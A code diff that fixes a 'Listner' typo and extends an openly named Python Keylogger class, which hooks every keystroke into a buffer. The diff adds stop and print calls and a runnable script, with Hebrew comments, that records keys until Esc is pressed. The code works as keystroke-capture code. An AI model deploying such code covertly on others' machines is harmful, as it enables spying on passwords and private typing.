@@ -1,11 +1,11 @@
 from typing import List, Protocol
+import keyboard
 
-
-class Listner(Protocol):
+class Listener(Protocol):
     buffer: List[str]  # buffer to store the data
 
     """
-    Listner is a protocol that defines the interface for listening to data.
+    Listener is a protocol that defines the interface for listening to data.
 
     it will may be implemented by classes that listen to data in different ways.
     such as:
@@ -28,11 +28,10 @@ class Listner(Protocol):
 
     def get_data(self) -> List[str]:
         """
-        get the data from the buffer.
-
-        Also, clear the buffer after getting the data.
+        get the data that has been collected.
         """
         ...
+
 class Keylogger:
     def __init__(self):
         self.buffer: List[str] = []
@@ -42,13 +41,14 @@ class Keylogger:
         start listening to keyboard events.
         """
         keyboard.hook(self._on_key_event)
+        print("Keylogger started. Press 'Esc' to stop.")
 
-
-    def start(self) -> None:
+    def stop(self) -> None:
         """
-        start listening to keyboard events.
+        stop listening to keyboard events.
         """
-        keyboard.hook(self._on_key_event)
+        keyboard.unhook_all()
+        print("Keylogger stopped.")
 
     def get_data(self) -> List[str]:
         """
@@ -61,3 +61,20 @@ class Keylogger:
         internal method to handle key events.
         """
         self.buffer.append(event.name)
+        print(f"Key pressed: {event.name}")
+
+# יצירת מופע של keylogger
+keylogger = Keylogger()
+
+# התחלת keylogger
+keylogger.start()
+
+# חכה עד שלוחצים על ESC לפני שסוגרים את התוכנית
+keyboard.wait('esc')
+
+# עצירת keylogger
+keylogger.stop()
+
+# קבלת הנתונים שנאספו
+data = keylogger.get_data()
+print("Data collected:", data)
